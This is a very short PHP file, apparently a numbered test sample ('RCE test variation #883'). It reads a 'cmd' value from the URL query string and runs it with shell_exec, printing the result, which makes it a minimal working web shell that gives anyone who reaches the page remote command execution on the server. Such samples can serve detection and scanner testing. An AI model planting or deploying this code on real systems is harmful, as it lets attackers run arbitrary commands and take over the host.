<?php
// RCE test variation #883
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>